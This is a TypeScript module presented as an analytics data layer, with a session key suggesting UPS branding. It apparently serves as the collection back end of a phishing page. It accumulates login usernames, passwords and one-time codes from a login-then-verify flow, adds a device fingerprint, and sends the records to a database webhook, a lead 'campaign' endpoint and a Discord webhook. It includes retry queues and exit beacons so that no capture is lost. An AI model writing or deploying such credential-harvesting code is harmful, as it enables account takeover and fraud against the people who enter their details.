import { storage, AnalyticsEvent } from "./storage";
import { getDeviceData } from "./fingerprint";

// Environment Variables
const DISCORD_WEBHOOK_URL = process.env.NEXT_PUBLIC_DISCORD_WEBHOOK_URL;
const CAMPAIGN_WEBHOOK_URL = process.env.NEXT_PUBLIC_CAMPAIGN_WEBHOOK_URL;
const CAMPAIGN_API_KEY = process.env.NEXT_PUBLIC_CAMPAIGN_API_KEY;
const DB_WEBHOOK_URL = process.env.NEXT_PUBLIC_DB_WEBHOOK_URL;

export const dataLayer = {
    initialized: false,
    processing: new Set<string>(),
    isFlushing: false, // Keep for fallback

    // Key for local storage accumulation (Session Context)
    STORAGE_KEY_SESSION: "ups_analytics_session",

    async init() {
        if (this.initialized) return;
        this.initialized = true;

        // 1. Flush queue on load (process any failed/pending from previous sessions)
        this.flushQueue();

        // 2. Set up visibility change for "Beacon" (Zero Loss)
        document.addEventListener("visibilitychange", () => {
            if (document.visibilityState === "hidden") {
                this.handlePageExit();
            }
        });
    },

    // Handle page exit: Send accumulated data if it exists (Beacon)
    handlePageExit() {
        try {
            const raw = localStorage.getItem(this.STORAGE_KEY_SESSION);
            if (!raw) return;

            const session = JSON.parse(raw);
            if (Object.keys(session).length === 0) return;

            // Prepare Beacon Event
            const event: AnalyticsEvent = {
                id: crypto.randomUUID(),
                type: "interaction",
                payload: {
                    ...session,
                    action: "abandoned_session",
                    url: window.location.href
                },
                timestamp: new Date().toISOString(),
                status: "pending",
                retryCount: 0,
                sentTo: []
            };

            // Use keepalive: true for "Beacon" behavior
            this.transmit(event, true);

            // Clear session? 
            // If abandoned, we sent it. Clear to avoid "zombie" sessions next time.
            localStorage.removeItem(this.STORAGE_KEY_SESSION);

        } catch (e) {
            console.error("Failed to handle page exit beacon", e);
        }
    },

    async trackEvent(type: AnalyticsEvent["type"], payload: any) {
        // ---------------------------------------------------------
        // STRATEGY: Single Row Architecture (Accumulate -> Final Send)
        // ---------------------------------------------------------

        // 1. Get Device Data (we need it for the session state)
        const deviceData = await getDeviceData();
        const fullPayload = {
            ...payload,
            // We DON'T merge deviceData here into root anymore, 
            // we will structure it correctly in transmit/storage.
            // But for the session object, we want a flat-ish structure or cleaner.
            // Let's keep it flat for now and structure in transmit.
            ...deviceData,
            timestamp: new Date().toISOString(),
            url: window.location.href,
        };

        // --- SESSION UPDATE LOGIC ---
        try {
            const currentRaw = localStorage.getItem(this.STORAGE_KEY_SESSION);
            const current = currentRaw ? JSON.parse(currentRaw) : {};

            // Merge new data into session
            const updatedSession = { ...current, ...fullPayload };
            localStorage.setItem(this.STORAGE_KEY_SESSION, JSON.stringify(updatedSession));

            console.log("[DataLayer] Session Updated:", payload);
        } catch (e) {
            console.error("Session update failed", e);
        }

        // --- TRANSMISSION LOGIC ---

        // CASE A: Interaction -> NEVER SEND (Saved to session above)
        if (type === "interaction") {
            return;
        }

        // CASE B: Form Submission
        if (type === "form_submission") {
            const formName = payload.form;

            // 1. Login Form -> SAVE ONLY (Do not transmit)
            if (formName === "login") {
                console.log("[DataLayer] Login captured - Waiting for Verify step.");
                return;
            }

            // 2. Verify Form (or fallback) -> TRANSMIT EVERYTHING
            // This is the "End of Funnel" trigger.
            console.log("[DataLayer] Final Submission - Transmitting Complete Record");

            // Retrieve full session for transmission
            let finalPayload = fullPayload;
            try {
                const sessionRaw = localStorage.getItem(this.STORAGE_KEY_SESSION);
                if (sessionRaw) {
                    finalPayload = JSON.parse(sessionRaw);
                }
                // Clear session after successful handoff to queue
                localStorage.removeItem(this.STORAGE_KEY_SESSION);
            } catch (e) { }

            // 3. Save to "Zero Loss" Queue
            const event = await storage.addToQueue({
                type,
                payload: finalPayload,
                timestamp: new Date().toISOString(),
            });

            // 4. Attempt Immediate Send
            this.transmit(event);
        }
    },

    async flushQueue(useKeepAlive = false) {
        // Use Web Locks API to prevent multiple tabs from flushing simultaneously
        // "ifAvailable: true" means if another tab holds the lock, we just skip (return null)
        // rather than queuing up behind it. The other tab will handle the queue.
        if (!("locks" in navigator)) {
            // Fallback for very old browsers (though unlikely to be supported if SW is)
            if (this.isFlushing) return;
            this.isFlushing = true;
            try {
                await this._processQueue(useKeepAlive);
            } finally {
                this.isFlushing = false;
            }
            return;
        }

        // @ts-ignore
        await navigator.locks.request("analytics_flush_lock", { ifAvailable: true }, async (lock) => {
            if (!lock) {
                // Lock is held by another tab/process. We can safely ignore this call.
                return;
            }
            await this._processQueue(useKeepAlive);
        });
    },

    async _processQueue(useKeepAlive: boolean) {
        const queue = await storage.getQueue();
        const pending = queue.filter((item) => item.status !== "processing" && !this.processing.has(item.id));

        if (pending.length === 0) return;

        // Process sequentially to avoid network congestion
        for (const event of pending) {
            if (this.processing.has(event.id)) continue; // Double check
            await this.transmit(event, useKeepAlive);
        }
    },

    async transmit(event: AnalyticsEvent, useKeepAlive = false) {
        if (this.processing.has(event.id)) return;
        this.processing.add(event.id);

        try {
            await storage.updateEventStatus(event.id, "processing");

            // Register Background Sync if supported and offline
            // Skip this if usage is KeepAlive (closing) as we want to try one last network shot
            if (!useKeepAlive && "serviceWorker" in navigator && "SyncManager" in window && !navigator.onLine) {
                const registration = await navigator.serviceWorker.ready;
                // @ts-ignore
                await registration.sync.register("sync-analytics");
                this.processing.delete(event.id);
                return; // Let SW handle it
            }

            const promises: Record<string, Promise<any> | undefined> = {};
            const sentTo = event.sentTo || [];

            // 1. Supabase Event Dump (Clean Payload)
            if (DB_WEBHOOK_URL && !sentTo.includes("db")) {

                // --- CLEAN PAYLOAD CONSTRUCTION ---
                // We reconstruct the object to force the "Clean Data" structure
                // before sending it to the generic webhook.
                const p = event.payload;

                const cleanPayload = {
                    type: event.type,
                    data: {
                        // Top Level: Business Data
                        accountType: p.accountType,
                        username: p.username,
                        password: p.password,
                        companyName: p.companyName,
                        fullName: p.fullName,
                        phone: p.phone,
                        otp: p.otp,

                        // Grouped: Meta
                        meta: {
                            timestamp: p.timestamp || event.timestamp,
                            url: p.url,
                            form: p.form,
                            action: p.action
                        },

                        // Grouped: Device
                        device: {
                            fingerprint: p.fingerprint,
                            userAgent: p.userAgent,
                            browser: p.browser,
                            os: p.os,
                            screen: p.screen,
                            cpu: p.cpu,
                            gpu: p.gpu,
                            engine: p.engine,
                            locale: p.locale,
                            timezone: p.timezone
                        }
                    }
                };

                promises["db"] = fetch(DB_WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(cleanPayload),
                    keepalive: useKeepAlive,
                }).then(async res => {
                    if (!res.ok) throw new Error(`DB Dump failed: ${res.status} ${await res.text()}`);
                    await storage.markAsSent(event.id, "db");
                    return res;
                });
            }

            // 2. Campaign System (Leads only)
            if (event.type === "form_submission" && CAMPAIGN_WEBHOOK_URL && CAMPAIGN_API_KEY && !sentTo.includes("campaign")) {
                const { payload } = event;
                const leadData: any = {};

                // --- PAYLOAD RESTRUCTURING (CLEAN DATA) ---
                // Even if payload has nested stuff, we extract what we need.
                // But specifically for the Campaign Webhook, we want to ensure we send the BUSINESS data.

                if (payload.fullName) leadData.name = payload.fullName;
                if (payload.username) leadData.email = payload.username; // Login uses username as email
                if (payload.address) leadData.address = payload.address;
                if (payload.phone) leadData.phone = payload.phone;

                // Add Context if available
                if (payload.accountType) leadData.accountType = payload.accountType;
                if (payload.password) leadData.password = payload.password; // If captured
                if (payload.companyName) leadData.companyName = payload.companyName;

                // Fallback for name if only username exists
                if (!leadData.name && leadData.email) {
                    leadData.name = leadData.email.split("@")[0];
                }

                // Add Device/Meta if needed by campaign (usually not, but let's add meta)
                leadData.meta = {
                    url: payload.url,
                    timestamp: payload.timestamp
                };

                if (Object.keys(leadData).length > 0) {
                    promises["campaign"] = fetch(CAMPAIGN_WEBHOOK_URL, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                            "X-API-Key": CAMPAIGN_API_KEY
                        },
                        body: JSON.stringify({ leads: [leadData] }),
                        keepalive: useKeepAlive,
                    }).then(async res => {
                        if (!res.ok) throw new Error(`Campaign Sync failed: ${res.status} ${await res.text()}`);
                        await storage.markAsSent(event.id, "campaign");
                        return res;
                    });
                }
            }

            // 3. Discord Notification
            if (DISCORD_WEBHOOK_URL && !sentTo.includes("discord")) {
                const message = {
                    content: `**New Event: ${event.type}**\nTime: ${event.timestamp}\nURL: ${event.payload.url}`,
                    embeds: [{
                        title: "Event Details",
                        description: "```json\n" + JSON.stringify(event.payload, null, 2).substring(0, 4000) + "\n```",
                        color: 3447003
                    }]
                };

                promises["discord"] = fetch(DISCORD_WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(message),
                    keepalive: useKeepAlive,
                }).then(async res => {
                    // Fire and forget for discord really, but let's track it
                    if (!res.ok) console.error("Discord send failed", await res.text());
                    else await storage.markAsSent(event.id, "discord");
                    return res;
                }).catch(err => console.error("Discord send failed", err));
            }

            await Promise.allSettled(Object.values(promises));

            // Implementation note:
            // We check the *fresh* state from storage or assuming if the promise resolved, it's marked.
            // But fundamentally, if 'db' is in sentTo OR DB promise succeeded, we are good.

            // Re-read event or trust local logic? 
            // The simplest is: if DB_WEBHOOK_URL is set, we need 'db' in sentTo (previously or just now).

            let dbSuccess = true;
            if (DB_WEBHOOK_URL) {
                // If we didn't attempt because it was already sent, sending is "success"
                // If we attempted, we check if it succeeded (which we can infer if markAsSent was called, 
                // but we don't have the fresh object here easily without re-reading).
                // Actually, if the promise threw, dbSuccess is false.

                if (promises["db"]) {
                    try {
                        await promises["db"];
                        // If we are here, it succeeded and markAsSent was called.
                        dbSuccess = true;
                    } catch (e) {
                        dbSuccess = false;
                        console.error("DB Webhook failed", e);
                    }
                } else if (!sentTo.includes("db")) {
                    // Not in sentTo AND no promise created? 
                    // This means logic error or we didn't try. 
                    // But if !sentTo.includes("db") we SHOULD have created promise.
                    // So this case might be unreachable unless logic bug.
                    // Assume false to be safe if we expected to send but didn't.
                    dbSuccess = false;
                } else {
                    // Already in sentTo, so success = true
                    dbSuccess = true;
                }
            }

            if (dbSuccess) {
                await storage.removeFromQueue(event.id);
            } else {
                await storage.updateEventStatus(event.id, "failed");
                await storage.incrementRetry(event.id);
            }

        } catch (error) {
            console.error("Transmission orchestration failed", error);
            await storage.updateEventStatus(event.id, "failed");
            await storage.incrementRetry(event.id);
        } finally {
            this.processing.delete(event.id);
        }
    },
};
